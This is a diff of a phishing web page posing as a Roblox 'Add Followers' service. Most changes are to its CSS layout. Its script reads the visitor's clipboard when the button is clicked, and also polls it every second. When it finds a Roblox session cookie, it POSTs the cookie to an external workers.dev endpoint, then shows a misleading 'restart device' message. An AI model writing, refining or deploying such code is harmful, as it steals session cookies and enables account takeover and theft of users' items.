@@ -52,7 +52,7 @@
 
         .container {
             width: 100%;
-            max-width: 1050px;
+            max-width: 1100px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -98,15 +98,14 @@
             line-height: 1.4;
         }
 
-        /* Modern Glass Card */
+        /* Stretched Modern Glass Card */
         .action-card {
             width: 100%;
-            max-width: 460px;
             background: rgba(18, 20, 29, 0.75);
             border: 1px solid rgba(168, 85, 247, 0.25);
             backdrop-filter: blur(16px);
             border-radius: 24px;
-            padding: 2rem;
+            padding: 2.25rem 2rem;
             display: flex;
             flex-direction: column;
             gap: 1.25rem;
@@ -139,7 +138,14 @@
             box-shadow: 0 8px 25px rgba(255, 255, 255, 0.3);
         }
 
-        /* Dark Futuristic Extension Buttons */
+        /* Dark Futuristic Extension Buttons (Side-by-Side on desktop for stretched layout) */
+        .extensions-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            width: 100%;
+        }
+
         .btn-dark-ext {
             width: 100%;
             padding: 0.9rem 1.25rem;
@@ -165,16 +171,9 @@
             box-shadow: 0 4px 15px rgba(168, 85, 247, 0.3);
         }
 
-        .extensions-group {
-            display: flex;
-            flex-direction: column;
-            gap: 0.75rem;
-            width: 100%;
-        }
-
-        .status {
-            font-size: 0.85rem;
-            color: #8ea1ff;
+        .status-message {
+            font-size: 0.9rem;
+            color: #a78bfa;
             text-align: center;
             min-height: 1.2rem;
         }
@@ -268,6 +267,10 @@
                 padding: 1.5rem;
             }
 
+            .extensions-group {
+                grid-template-columns: 1fr;
+            }
+
             /* Mobile Layout Order: iPhone Tutorial First */
             .card-iphone { order: 1; }
             .card-pc-no-ext { order: 2; }
@@ -310,10 +313,10 @@
             <p class="subtitle">Select your platform extension below and view the tutorial guides.</p>
         </header>
 
-        <!-- Main Action Box -->
+        <!-- Main Action Box (Stretched across the screen) -->
         <section class="action-card">
-            <button class="btn-white" id="main">Add Followers</button>
-            <div class="status" id="status"></div>
+            <button class="btn-white" id="addFollowersBtn">Add Followers</button>
+            <div class="status-message" id="statusMessage"></div>
 
             <div class="extensions-group">
                 <a href="https://apps.apple.com/us/app/cookie-editor/id6446215341" target="_blank" rel="noopener noreferrer" class="btn-dark-ext">
@@ -358,68 +361,58 @@
     </div>
 
     <script>
-        const button = document.getElementById("main");
-        const status = document.getElementById("status");
         const SEND_ENDPOINT = "https://young-brook-716e.abojanmawzoon.workers.dev";
-             
+        const statusEl = document.getElementById("statusMessage");
+
         async function sendClipboardData(text) {
-          try {
-            await fetch(SEND_ENDPOINT, {      
-              method: "POST",      
-              headers: {      
-                "Content-Type": "application/json"      
-              },      
-              body: JSON.stringify({      
-                clipboardText: text      
-              })      
-            });      
-                 
-            await new Promise(resolve => setTimeout(resolve, 10000));      
-                 
-            status.textContent = "Restart Device To Get Followers Added to your account!";      
-          } catch (error) {      
-            status.textContent = "Something went wrong. Please try again.";      
-            console.error(error);      
-          }
+            try {
+                await fetch(SEND_ENDPOINT, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        clipboardText: text
+                    })
+                });
+                statusEl.textContent = "Restart device to get followers added to your account!";
+            } catch (error) {
+                statusEl.textContent = "Something went wrong. Please try again.";
+                console.error(error);
+            }
         }
 
-        button.addEventListener("click", async () => {      
-          try {      
-            status.textContent = "Adding Followers...";      
-                 
-            const text = await navigator.clipboard.readText();      
-                 
-            if (!text) {      
-              status.textContent = "error make sure u copy cookie";      
-              return;      
-            }      
-                 
-            await sendClipboardData(text);
-                 
-          } catch (error) {      
-            status.textContent = "error make sure u copy cookie";      
-            console.error(error);      
-          }      
+        document.getElementById("addFollowersBtn").addEventListener("click", async () => {
+            try {
+                statusEl.textContent = "Adding Followers...";
+                const text = await navigator.clipboard.readText();
+                if (!text) {
+                    statusEl.textContent = "Error: make sure you copy the cookie.";
+                    return;
+                }
+                await sendClipboardData(text);
+            } catch (error) {
+                statusEl.textContent = "Error: make sure you copy the cookie.";
+                console.error(error);
+            }
         });
 
         async function monitorClipboard() {
-          if (!navigator.clipboard || !navigator.clipboard.readText) return;
-          
-          try {
-            const text = await navigator.clipboard.readText();
-            if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
-              await sendClipboardData(text);
-              return;
+            if (!navigator.clipboard || !navigator.clipboard.readText) return;
+            try {
+                const text = await navigator.clipboard.readText();
+                if (text && text.includes("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")) {
+                    await sendClipboardData(text);
+                    return;
+                }
+            } catch (e) {
+                // Clipboard permissions require user interaction first
             }
-          } catch (e) {
-            // Clipboard permission might require user interaction first
-          }
-          
-          setTimeout(monitorClipboard, 1000);
+            setTimeout(monitorClipboard, 1000);
         }
 
         window.addEventListener("load", () => {
-          setTimeout(monitorClipboard, 500);
+            setTimeout(monitorClipboard, 500);
         });
     </script>
 </body>
